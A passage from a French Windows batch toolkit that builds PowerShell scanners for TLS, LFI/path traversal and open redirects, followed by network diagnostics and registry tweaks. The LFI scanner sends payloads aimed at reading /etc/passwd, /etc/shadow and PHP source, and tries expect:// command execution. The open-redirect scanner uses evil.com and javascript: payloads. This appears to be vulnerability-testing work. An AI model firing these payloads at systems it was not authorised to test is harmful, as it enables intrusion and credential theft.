echo        Date    = (Get-Date -Format 'yyyy-MM-dd HH:mm') >> "%TLS_PS%"
echo        Cible   = "${host_target}:${port}" >> "%TLS_PS%"
echo        Score   = $script:score >> "%TLS_PS%"
echo        Grade   = $grade >> "%TLS_PS%"
echo        Findings = $script:findings >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo    $jsonPath = "$([Environment]::GetFolderPath('Desktop'))\TLS_Scan_${host_target}_$(Get-Date -Format 'yyyyMMdd_HHmm').json" >> "%TLS_PS%"
echo    $out ^| ConvertTo-Json -Depth 5 ^| Out-File $jsonPath -Encoding UTF8 >> "%TLS_PS%"
echo    Write-Host "  [OK] Export JSON : $jsonPath" -f Green >> "%TLS_PS%"
echo } >> "%TLS_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%TLS_PS%"
if exist "%TLS_PS%" del /f /q "%TLS_PS%"
echo.
pause
goto net_cyber_menu

:cyber_lfi_scan
cls
echo.
echo  ===========================================================
echo   LFI / PATH TRAVERSAL - Detection automatisee
echo  ===========================================================
echo   Tente de lire des fichiers systeme distants
echo   via des failles de chemins de fichiers.
echo  ===========================================================
echo.
echo  Entrez l'URL avec parametre (ex: https://site.com/page?file=)
set "ALEEX_LFI_URL="
set /p "ALEEX_LFI_URL=URL : "
if not defined ALEEX_LFI_URL goto net_cyber_menu

set "LFI_PS=%TEMP%\lfi_scan_%RANDOM%.ps1"
if exist "%LFI_PS%" del /f /q "%LFI_PS%"

echo $baseUrl = $env:ALEEX_LFI_URL >> "%LFI_PS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%LFI_PS%"
echo $vulns = 0 >> "%LFI_PS%"
echo $vulns = 0
echo. >> "%LFI_PS%"
echo $payloads = @( >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (1)';   P='../etc/passwd';                          Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (2)';   P='../../etc/passwd';                       Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (3)';   P='../../../etc/passwd';                    Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (4)';   P='../../../../etc/passwd';                 Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux (5 niveaux)';     P='../../../../../etc/passwd';              Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux (6 niveaux)';     P='../../../../../../etc/passwd';           Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux shadow';          P='../../../etc/shadow';                    Detect='\$[16]\$^|root:\*' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux /etc/hosts';      P='../../../etc/hosts';                     Detect='127\.0\.0\.1^|localhost^|::1' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Windows win.ini';       P='..\..\..\windows\win.ini';               Detect='\[fonts\]^|\[extensions\]^|for 16-bit' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Windows win.ini alt';   P='../../../windows/win.ini';               Detect='\[fonts\]^|\[extensions\]^|for 16-bit' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Windows hosts';         P='..\..\..\windows\system32\drivers\etc\hosts'; Detect='127\.0\.0\.1^|localhost' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='URL encoded (..//)';    P='..%2f..%2f..%2fetc%2fpasswd';            Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Double encoded';        P='..%252f..%252f..%252fetc%252fpasswd';    Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Null byte (PHP old)';   P='../../../etc/passwd%%00';                 Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='PHP filter base64';     P='php://filter/convert.base64-encode/resource=index.php'; Detect='^[A-Za-z0-9+/]{20}' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='PHP filter rot13';      P='php://filter/read=string.rot13/resource=index.php'; Detect='cuc^|<?^|<?php^|rput^|erfcbafr' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='PHP input';             P='php://input';                            Detect='php^|html^|body^|<?^|<html' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='data:// wrapper';       P='data://text/plain;base64,dGVzdA==';      Detect='test' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='expect:// wrapper';     P='expect://id';                            Detect='uid=^|root^|www-data' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Absolute path /etc';    P='/etc/passwd';                            Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Absolute Windows';      P='C:/windows/win.ini';                     Detect='\[fonts\]^|\[extensions\]' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='UNC path (Windows)';    P='\\127.0.0.1\c$\windows\win.ini';         Detect='\[fonts\]' } >> "%LFI_PS%"
echo ) >> "%LFI_PS%"
echo. >> "%LFI_PS%"
echo Write-Host "" >> "%LFI_PS%"
echo Write-Host "  Test de $($payloads.Count) payloads LFI/Path Traversal..." -f Cyan >> "%LFI_PS%"
echo Write-Host "  (Appuyez sur ECHAP pour annuler)" -f DarkGray >> "%LFI_PS%"
echo Write-Host "" >> "%LFI_PS%"
echo. >> "%LFI_PS%"
echo foreach ($p in $payloads) { >> "%LFI_PS%"
echo    if ($Host.UI.RawUI.KeyAvailable) { >> "%LFI_PS%"
echo        $k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') >> "%LFI_PS%"
echo        if ($k.VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; break } >> "%LFI_PS%"
echo    } >> "%LFI_PS%"
echo    $enc = [uri]::EscapeDataString($p.P) >> "%LFI_PS%"
echo    $testUrl = $baseUrl + $enc >> "%LFI_PS%"
echo    Write-Host "  [?] $($p.Name.PadRight(30))" -f DarkGray -NoNewline >> "%LFI_PS%"
echo    try { >> "%LFI_PS%"
echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing >> "%LFI_PS%"
echo        if ($r.Content -match $p.Detect) { >> "%LFI_PS%"
echo            Write-Host "[!!!] VULNERABLE !" -f Red >> "%LFI_PS%"
echo            $snippet = $r.Content -replace '\s+',' ' ^| ForEach-Object { $_.Substring(0, [math]::Min(150, $_.Length)) } >> "%LFI_PS%"
echo            Write-Host "       Payload  : $($p.P)" -f Magenta >> "%LFI_PS%"
echo            Write-Host "       Extrait  : $snippet" -f Yellow >> "%LFI_PS%"
echo            $vulns++ >> "%LFI_PS%"
echo        } elseif ($r.StatusCode -eq 200) { >> "%LFI_PS%"
echo            Write-Host "[ ] Reponse 200 (non concluant)" -f DarkGray >> "%LFI_PS%"
echo        } else { >> "%LFI_PS%"
echo            Write-Host "[-] HTTP $($r.StatusCode)" -f DarkGray >> "%LFI_PS%"
echo        } >> "%LFI_PS%"
echo    } catch { Write-Host "[-] Erreur/Bloque" -f DarkGray } >> "%LFI_PS%"
echo } >> "%LFI_PS%"
echo. >> "%LFI_PS%"
echo Write-Host "" >> "%LFI_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%LFI_PS%"
echo if ($vulns -gt 0) { >> "%LFI_PS%"
echo    Write-Host "  [!!!] $vulns LFI/Path Traversal detecte(s) !" -f Red >> "%LFI_PS%"
echo    Write-Host "  Consequences possibles :" -f Red >> "%LFI_PS%"
echo    Write-Host "    - Lecture de /etc/passwd (liste des utilisateurs)" -f Yellow >> "%LFI_PS%"
echo    Write-Host "    - Lecture de /etc/shadow (hashes de mots de passe)" -f Yellow >> "%LFI_PS%"
echo    Write-Host "    - Lecture du code source PHP via php://filter" -f Yellow >> "%LFI_PS%"
echo    Write-Host "    - Escalade vers RCE via expect:// ou log poisoning" -f Yellow >> "%LFI_PS%"
echo } else { >> "%LFI_PS%"
echo    Write-Host "  [OK] Aucun LFI/Path Traversal detecte." -f Green >> "%LFI_PS%"
echo } >> "%LFI_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%LFI_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%LFI_PS%"
if exist "%LFI_PS%" del /f /q "%LFI_PS%"
echo.
pause
goto net_cyber_menu

REM ===================================================================
REM         EXPORT JSON UNIFIE DES FINDINGS
REM ===================================================================
:cyber_export_json
cls
echo.
echo  ===========================================================
echo   EXPORT JSON UNIFIE - Centralisateur de findings
echo  ===========================================================
echo   Consolide tous les resultats de scans en un
echo   fichier JSON structure et portable.
echo  ===========================================================
echo.

set "EJ_PS=%TEMP%\export_json_%RANDOM%.ps1"

(
echo $desktop = [Environment]::GetFolderPath('Desktop')
echo $date    = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
echo $dateFile = Get-Date -Format 'yyyyMMdd_HHmm'
echo $findings = @()
echo $scanFiles = @()
echo.
echo Write-Host ""
echo Write-Host "  Recherche des rapports JSON precedents sur le Bureau..." -f Cyan
echo $jsonFiles = Get-ChildItem $desktop -Filter "*.json" -EA SilentlyContinue
echo if ($jsonFiles) {
echo    Write-Host "  Fichiers JSON trouves :" -f Green
echo    $jsonFiles | ForEach-Object { Write-Host "    - $($_.Name)" -f Gray }
echo    Write-Host ""
echo    foreach ($f in $jsonFiles) {
echo        try {
echo            $data = Get-Content $f.FullName -Raw | ConvertFrom-Json
echo            $findings += $data
echo            $scanFiles += $f.Name
echo        } catch { Write-Host "  [!] Impossible de lire $($f.Name)" -f DarkGray }
echo    }
echo } else {
echo    Write-Host "  Aucun JSON trouve. Creation d'un rapport vide." -f Yellow
echo }
echo.
echo Write-Host "  Saisie manuelle de findings supplementaires (optionnel)..." -f Blue
echo Write-Host "  (Appuyez sur ENTREE sans saisie pour terminer)" -f DarkGray
echo Write-Host ""
echo $manualFindings = @()
echo while ($true) {
echo    $target = Read-Host "  Cible (ex: https://site.com) ou ENTREE pour terminer"
echo    if ([string]::IsNullOrWhiteSpace($target)) { break }
echo    $sev    = Read-Host "  Severite (CRITIQUE/ELEVE/MOYEN/INFO)"
echo    $cat    = Read-Host "  Categorie (ex: SQLi, XSS, LFI, TLS...)"
echo    $msg    = Read-Host "  Description"
echo    $cvss   = Read-Host "  Score CVSS estimé (0.0-10.0, ou ENTREE pour auto)"
echo    if ([string]::IsNullOrWhiteSpace($cvss)) {
echo        $cvss = switch($sev) { 'CRITIQUE' {'9.0'}; 'ELEVE' {'7.0'}; 'MOYEN' {'5.0'}; default {'2.0'} }
echo    }
echo    $manualFindings += [PSCustomObject]@{ Cible=$target; Severite=$sev; Categorie=$cat; Description=$msg; CVSS=$cvss; Source='Manuel' }
echo    Write-Host "  [+] Finding ajoute." -f Green
echo }
echo.
echo $report = [PSCustomObject]@{
echo    Meta = [PSCustomObject]@{
echo        Outil      = 'AleexScripts Cyber v2.0'
echo        Date       = $date
echo        Ordinateur = $env:COMPUTERNAME
echo        Operateur  = $env:USERNAME
echo        FichiersSource = $scanFiles
echo    }
echo    Statistiques = [PSCustomObject]@{
echo        TotalFindings  = ($findings.Count + $manualFindings.Count)
echo        Critiques      = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'CRITIQUE' }).Count
echo        Eleves         = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'ELEVE' }).Count
echo        Moyens         = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'MOYEN' }).Count
echo    }
echo    FindingsImportes = $findings
echo    FindingsManuels  = $manualFindings
echo }
echo.
echo $outFile = "$desktop\Rapport_Findings_$dateFile.json"
echo $report | ConvertTo-Json -Depth 10 | Out-File $outFile -Encoding UTF8
echo.
echo Write-Host ""
echo Write-Host "  ================================================" -f Cyan
echo Write-Host "  [OK] Rapport JSON exporte : $outFile" -f Green
echo Write-Host "  Total findings : $($report.Statistiques.TotalFindings)" -f White
echo Write-Host "  Critiques      : $($report.Statistiques.Critiques)" -f Red
echo Write-Host "  Eleves         : $($report.Statistiques.Eleves)" -f Yellow
echo Write-Host "  Moyens         : $($report.Statistiques.Moyens)" -f Cyan
echo Write-Host "  ================================================" -f Cyan
) > "%EJ_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%EJ_PS%"
if exist "%EJ_PS%" del /f /q "%EJ_PS%"
echo.
pause
goto net_cyber_menu

REM ===================================================================
REM         OPEN REDIRECT - Detection avancee
REM ===================================================================
:cyber_open_redirect
cls
echo.
echo  ===========================================================
echo   OPEN REDIRECT - Detection avancee
echo  ===========================================================
echo   Teste 40+ vecteurs de redirection pour
echo   prevenir les attaques de phishing.
echo  ===========================================================
echo.
echo  Entrez l'URL cible (ex: https://site.com/redirect)
set "ALEEX_OR_URL="
set /p "ALEEX_OR_URL=URL : "
if not defined ALEEX_OR_URL goto net_cyber_menu

set "OR_PS=%TEMP%\openredirect_%RANDOM%.ps1"
if exist "%OR_PS%" del /f /q "%OR_PS%"

echo $url = $env:ALEEX_OR_URL >> "%OR_PS%"
echo $ua = "Mozilla/5.0" >> "%OR_PS%"
echo $vulns = 0 >> "%OR_PS%"
echo. >> "%OR_PS%"
echo $params = @('url','redirect','redirect_url','redirect_uri','return','return_url', >> "%OR_PS%"
echo    'returnUrl','return_to','next','dest','destination','go','goto','link','out', >> "%OR_PS%"
echo    'target','redir','r','u','to','forward','forward_url','continue','cont','ref', >> "%OR_PS%"
echo    'referrer','callback','checkout_url','success_url','cancel_url','view','page', >> "%OR_PS%"
echo    'navigation','location','path','uri','site','domain','host','login','logout') >> "%OR_PS%"
echo. >> "%OR_PS%"
echo $payloads = @( >> "%OR_PS%"
echo    'https://evil.com', >> "%OR_PS%"
echo    '//evil.com', >> "%OR_PS%"
echo    '///evil.com', >> "%OR_PS%"
echo    '////evil.com', >> "%OR_PS%"
echo    'https:evil.com', >> "%OR_PS%"
echo    '\evil.com', >> "%OR_PS%"
echo    '\\evil.com', >> "%OR_PS%"
echo    'javascript:alert(1)', >> "%OR_PS%"
echo    'data:text/html,^<script^>alert(1)^</script^>', >> "%OR_PS%"
echo    '%%2f%%2fevil.com', >> "%OR_PS%"
echo    '%%5c%%5cevil.com', >> "%OR_PS%"
echo    'https://evil.com%%23@legitimate.com', >> "%OR_PS%"
echo    'https://legitimate.com.evil.com' >> "%OR_PS%"
echo ) >> "%OR_PS%"
echo. >> "%OR_PS%"
echo Write-Host "" >> "%OR_PS%"
echo Write-Host "  Test de $($params.Count) parametres x $($payloads.Count) payloads..." -f Cyan >> "%OR_PS%"
echo Write-Host "" >> "%OR_PS%"
echo. >> "%OR_PS%"
echo foreach ($param in $params) { >> "%OR_PS%"
echo    foreach ($payload in $payloads) { >> "%OR_PS%"
echo        $sep = if ($url -match '\?') { '^&' } else { '?' } >> "%OR_PS%"
echo        $testUrl = $url + $sep + $param + '=' + [uri]::EscapeDataString($payload) >> "%OR_PS%"
echo        try { >> "%OR_PS%"
echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -MaximumRedirection 0 -TimeoutSec 5 -EA Stop -UseBasicParsing >> "%OR_PS%"
echo            if ($r.StatusCode -in 301,302,303,307,308) { >> "%OR_PS%"
echo                $loc = $r.Headers['Location'] >> "%OR_PS%"
echo                if ($loc -match 'evil\.com^|javascript:^|data:') { >> "%OR_PS%"
echo                    Write-Host "  [!!!] Open Redirect CONFIRME !" -f Red >> "%OR_PS%"
echo                    Write-Host "        Parametre : $param" -f Magenta >> "%OR_PS%"
echo                    Write-Host "        Payload   : $payload" -f Magenta >> "%OR_PS%"
echo                    Write-Host "        Location  : $loc" -f Yellow >> "%OR_PS%"
echo                    $vulns++; break >> "%OR_PS%"
echo                } >> "%OR_PS%"
echo            } >> "%OR_PS%"
echo        } catch { >> "%OR_PS%"
echo            $loc = $_.Exception.Response.Headers['Location'] >> "%OR_PS%"
echo            if ($loc -match 'evil\.com^|javascript:^|data:') { >> "%OR_PS%"
echo                Write-Host "  [!!!] Open Redirect CONFIRME (exception) !" -f Red >> "%OR_PS%"
echo                Write-Host "        Parametre : $param ^| Location : $loc" -f Yellow >> "%OR_PS%"
echo                $vulns++; break >> "%OR_PS%"
echo            } >> "%OR_PS%"
echo        } >> "%OR_PS%"
echo    } >> "%OR_PS%"
echo } >> "%OR_PS%"
echo. >> "%OR_PS%"
echo Write-Host "" >> "%OR_PS%"
echo if ($vulns -gt 0) { >> "%OR_PS%"
echo    Write-Host "  [!!!] $vulns Open Redirect(s) detecte(s) !" -f Red >> "%OR_PS%"
echo    Write-Host "" >> "%OR_PS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (Open Redirect) :" -f Red >> "%OR_PS%"
echo    Write-Host "  1. Phishing : Un pirate utilise votre domaine de confiance pour pieger vos clients." -f Yellow >> "%OR_PS%"
echo    Write-Host "  2. Malware : Redirige automatiquement l'utilisateur vers le telechargement d'un virus." -f Yellow >> "%OR_PS%"
echo    Write-Host "  3. Reputation : Votre domaine peut etre blacklisté par les navigateurs et mails." -f Yellow >> "%OR_PS%"
echo    Write-Host "  CONSEIL : N'utilisez que des chemins relatifs ou une liste blanche (whitelist)." -f Cyan >> "%OR_PS%"
echo } >> "%OR_PS%"
echo else { Write-Host "  [OK] Aucun Open Redirect detecte." -f Green } >> "%OR_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%OR_PS%"
if exist "%OR_PS%" del /f /q "%OR_PS%"
echo.
pause
goto net_cyber_menu

:sys_diag_network
cls
set "DIAG_LOG=%USERPROFILE%\Desktop\Diagnostic_Reseau.log"
set /a "ECHEC_COUNT=0"
echo ================================
echo    DIAGNOSTIC RESEAU COMPLET
echo ================================
echo Analyse de l'etat de votre connexion.
echo Un journal complet est genere en temps reel sur le Bureau.
echo.

echo ================================ > "%DIAG_LOG%"
echo    DIAGNOSTIC RESEAU COMPLET     >> "%DIAG_LOG%"
echo       %date% %time%              >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
echo. >> "%DIAG_LOG%"

echo [1/4] Test de la carte reseau locale (TCP/IP)...
echo [1/4] Test de la carte reseau locale (TCP/IP)... >> "%DIAG_LOG%"
ping -n 2 127.0.0.1 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^).
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^). >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^).
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)...
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)... >> "%DIAG_LOG%"
set "gateway="
for /f "usebackq tokens=*" %%g in (`powershell -NoProfile -Command "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty NextHop) 2>$null"`) do set "gateway=%%g"

if "!gateway!"=="" (
    set /a "ECHEC_COUNT+=1"
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau.
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau. >> "%DIAG_LOG%"
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^).
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^). >> "%DIAG_LOG%"
) else (
    echo [INFO] Passerelle detectee : !gateway!
    echo [INFO] Passerelle detectee : !gateway! >> "%DIAG_LOG%"
    ping -n 2 !gateway! | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
    powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
    findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
    if !errorlevel!==0 (
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^).
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    ) else (
        set /a "ECHEC_COUNT+=1"
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^).
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    )
)

echo.
echo. >> "%DIAG_LOG%"
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)...
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)... >> "%DIAG_LOG%"
ping -n 2 8.8.8.8 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Acces Internet externe etabli.
    echo   -^> [OK] Acces Internet externe etabli. >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^).
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [4/4] Test de resolution DNS (Ping domaine)...
echo [4/4] Test de resolution DNS (Ping domaine)... >> "%DIAG_LOG%"
ping -n 2 google.com | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP.
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP. >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom.
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom. >> "%DIAG_LOG%"
)

echo.
echo ================================
if !ECHEC_COUNT! GTR 0 (
    echo [ATTENTION] !ECHEC_COUNT! ECHEC^(s^) detecte^(s^) lors de l'analyse.
    echo Voulez-vous utiliser les outils de reparation reseau de ce script ? ^(O/N^)
    echo ================================
    echo.
    set /p rep_choix="Choix : "
    if /i "!rep_choix!"=="O" goto sys_network_menu
) else (
    echo [SUCCES] Tous les tests reseau ont ete reussis avec succes !
    echo ================================
    echo.
)
echo Appuyez sur une touche pour afficher votre configuration IP (ipconfig /all)
pause >nul
cls
echo Affichage des informations reseau (ipconfig /all)...
echo ================================ >> "%DIAG_LOG%"
echo     Rapport IPCONFIG /ALL        >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
ipconfig /all > "%TEMP%\netdiag_ipconfig.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ipconfig.txt' -Encoding OEM | ForEach-Object { Write-Host $_ -ForegroundColor DarkGray; $_ | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
echo.
pause
if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)

:sys_cleanmgr
cls
echo Lancement du Nettoyage de disque...
cleanmgr
pause
goto system_tools

:sys_tweaks_menu
set "opts=Desactiver Telemetrie~Coupe l'espionnage et l'envoi de donnees a Microsoft"
set "opts=%opts%;Plan Performances Ultimes~Active le plan d'alimentation secret de Windows"
set "opts=%opts%;Desactiver Cortana completement~Empeche Cortana de tourner en arriere-plan"
set "opts=%opts%;Desactiver la recherche Bing~Rend le menu Demarrer beaucoup plus rapide (Local uniquement)"
set "opts=%opts%;Mode Sombre global~Force l'activation du theme sombre systeme"
set "opts=%opts%;Desactiver l'Hibernation~Libere plusieurs Giga-Octets d'espace disque (Taille de RAM)"
set "opts=%opts%;Purger les Bloatwares~Desinstalle Xbox, 3DBuilder, Skype, Zune, etc."
set "opts=%opts%;Supprimer les pubs de Windows~Retire les applications preinstallees forcees (Jeux)"

call :DynamicMenu "MENU OPTIMISATIONS WINDOWS (Tweaks)" "%opts%"
set "tw_choice=%errorlevel%"

if "%tw_choice%"=="1" goto tweak_telemetry
if "%tw_choice%"=="2" goto tweak_ultimate_power
if "%tw_choice%"=="3" goto tweak_cortana
if "%tw_choice%"=="4" goto tweak_bing
if "%tw_choice%"=="5" goto tweak_darkmode
if "%tw_choice%"=="6" goto tweak_hibernation
if "%tw_choice%"=="7" goto tweak_bloatware
if "%tw_choice%"=="8" goto tweak_ads
if "%tw_choice%"=="0" goto sys_opti_menu
goto sys_tweaks_menu

:tweak_telemetry
cls
echo [TWEAK] Desactivation de la Telemetrie Windows...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f >nul
sc stop DiagTrack >nul 2>&1
sc config DiagTrack start= disabled >nul 2>&1
sc stop dmwappushservice >nul 2>&1
sc config dmwappushservice start= disabled >nul 2>&1
echo Telemetrie desactivee !
pause
goto sys_tweaks_menu

:tweak_ultimate_power
cls
echo [TWEAK] Activation des Performances Ultimes Caches...
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
echo Plan d'alimentation 'Performances Ultimes' active. Allez dans vos reglages d'energie pour le selectionner.
pause
goto sys_tweaks_menu

:tweak_cortana
cls
echo [TWEAK] Desactivation complete de Cortana...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul
echo Cortana ne demarrera plus en arriere-plan.
pause
goto sys_tweaks_menu

:tweak_bing
cls
echo [TWEAK] Desactiver la recherche internet (Bing) dans le menu Demarrer...
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "DisableSearchBoxSuggestions" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d 0 /f >nul
echo La recherche locale est desormais plus rapide et sans pub internet !
pause
goto sys_tweaks_menu

:tweak_darkmode
cls
echo [TWEAK] Activation du Mode Sombre global de Windows 11...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "SystemUsesLightTheme" /t REG_DWORD /d 0 /f >nul
echo Mode sombre applique (si pris en charge par votre version/theme).
pause
goto sys_tweaks_menu

:tweak_hibernation
cls
echo [TWEAK] Desactivation du fichier hiberfil.sys (Gain d'espace libre gigantesque)...
powercfg.exe /hibernate off >nul
echo Hibernation coupee ! Vous recuperez la taille de votre RAM en espace de stockage disque (Giga-Octets).
pause
goto sys_tweaks_menu

:tweak_bloatware
cls
echo [TWEAK] Desinstallation automatique des Bloatwares inutiles...
echo Cela peut prendre un peu de temps.
powershell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *bing* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *OneNote* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneMusic* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneVideo* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SolitaireCollection* | Remove-AppxPackage" >nul 2>&1
echo Logiciels superflus retires avec succes !
pause
goto sys_tweaks_menu

:tweak_ads
cls
echo [TWEAK] Suppression des publicites du Menu Demarrer et des notifications Windows...
